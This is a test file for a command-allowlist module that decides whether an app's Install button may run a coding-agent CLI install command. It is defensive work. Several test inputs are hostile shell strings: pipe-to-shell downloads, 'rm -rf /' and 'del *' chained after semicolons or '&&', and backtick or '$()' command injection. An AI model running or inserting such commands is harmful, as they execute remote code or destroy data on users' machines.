import { describe, expect, it } from "vitest";
import { installPlan, isRunnable, commandTool, installOutcome } from "./agentInstall.cjs";

const claude = {
  installCommand: "npm install -g @anthropic-ai/claude-code",
  installDocs: "https://docs.claude.com/en/docs/claude-code/overview",
};

describe("installPlan", () => {
  it("offers to run a command it knows, when the tool is there", () => {
    expect(installPlan(claude, { npm: true })).toMatchObject({ action: "run", tool: "npm" });
  });

  // providers.ts leaves installCommand empty where nobody confirmed one. An
  // Install button that runs a guess is worse than a link to the docs.
  it("sends you to the docs when no command is known", () => {
    expect(installPlan({ installDocs: "https://example.test" })).toMatchObject({
      action: "docs",
      docs: "https://example.test",
    });
  });

  it("offers nothing at all when there is neither", () => {
    expect(installPlan({}).action).toBe("none");
  });

  // "npm: command not found" after a click is worse than saying so before one.
  it("will not run a command whose tool is missing", () => {
    const plan = installPlan(claude, { npm: false });
    expect(plan.action).toBe("copy");
    expect(plan.reason).toContain("npm is not installed");
    expect(plan.command).toBe(claude.installCommand);
  });

  // "Install" is exactly the word an attacker would pick for a button that
  // runs arbitrary shell, so only the published shapes are ever executed.
  it("shows rather than runs anything outside the shapes Pitwall publishes", () => {
    for (const command of [
      "curl https://example.test/install.sh | sh",
      "npm install -g pkg && rm -rf /",
      "npm install -g pkg; curl evil",
      "sudo npm install -g pkg",
      "npm run something",
      "brew install --cask ollama",
      "brew tap someone/tap",
      "uv pip install aider-chat",
      "npm install -g pkg > /tmp/out",
      "npm install -g $(echo pkg)",
      "npm install -g pkg`whoami`",
    ]) {
      expect(installPlan({ installCommand: command }, { npm: true }).action).toBe("copy");
    }
  });

  it("runs the two npm spellings, scoped or not", () => {
    expect(isRunnable("npm install -g @openai/codex")).toBe(true);
    expect(isRunnable("npm i -g @google/gemini-cli")).toBe(true);
    expect(isRunnable("npm install -g somecli")).toBe(true);
  });

  // Not every agent ships on npm: Goose is a Homebrew formula and Aider is a
  // Python tool, and sending those to a docs link when the command is a
  // single well-formed install would be timid rather than careful.
  it("runs the package managers the catalogue actually uses", () => {
    expect(isRunnable("brew install block-goose-cli")).toBe(true);
    expect(isRunnable("brew install charmbracelet/tap/crush")).toBe(true);
    expect(isRunnable("uv tool install aider-chat")).toBe(true);
    expect(isRunnable("pipx install aider-chat")).toBe(true);
  });

  // The shapes are anchored, so this is belt and braces — but the cost of
  // being wrong is arbitrary code on somebody's machine.
  it("refuses anything carrying shell punctuation, whatever else it matches", () => {
    expect(isRunnable("npm install -g pkg; rm -rf /")).toBe(false);
    expect(isRunnable("brew install pkg && curl evil")).toBe(false);
    expect(isRunnable("uv tool install pkg | sh")).toBe(false);
  });

  it("asks for the right tool for each shape", () => {
    expect(installPlan({ installCommand: "brew install block-goose-cli" }, { brew: false }).action).toBe("copy");
    expect(installPlan({ installCommand: "brew install block-goose-cli" }, { brew: true }).action).toBe("run");
    expect(installPlan({ installCommand: "uv tool install aider-chat" }, { uv: false }).reason).toContain("uv is not installed");
  });
});

describe("commandTool", () => {
  it("names the tool a command needs", () => {
    expect(commandTool("npm install -g x")).toBe("npm");
  });

  // A leading assignment is not the tool being invoked.
  it("is not fooled by a leading environment variable", () => {
    expect(commandTool("FORCE_COLOR=1 npm install -g x")).toBe("");
    expect(commandTool("")).toBe("");
  });
});

describe("installOutcome", () => {
  it("believes the CLI being there, not the exit code", () => {
    expect(installOutcome({ exitCode: 0, installedAfter: true }).ok).toBe(true);
    // A global npm install exits 0 having printed a permissions warning and
    // written nothing. That is the most common way this fails.
    expect(installOutcome({ exitCode: 0, installedAfter: false })).toMatchObject({ ok: false });
    expect(installOutcome({ exitCode: 0, installedAfter: false }).message).toContain("still is not on your PATH");
  });

  it("says so plainly when the command itself failed", () => {
    const outcome = installOutcome({ exitCode: 1, installedAfter: false });
    expect(outcome.ok).toBe(false);
    expect(outcome.message).toContain("exited with code 1");
  });

  // A non-zero exit that somehow left a working CLI is still a working CLI.
  it("trusts the CLI over a failed exit code", () => {
    expect(installOutcome({ exitCode: 1, installedAfter: true }).ok).toBe(true);
  });
});

describe("installing on Windows", () => {
  it("runs a winget install by exact package id, and only shows a PowerShell one-liner", () => {
    expect(isRunnable("winget install --id Ollama.Ollama -e")).toBe(true);
    expect(isRunnable("winget install --id Ollama.Ollama -e; del *")).toBe(false);
    expect(installPlan({ installCommand: "irm 'https://cursor.com/install?win32=true' | iex", installDocs: "https://cursor.com" })).toMatchObject({ action: "copy" });
  });
});
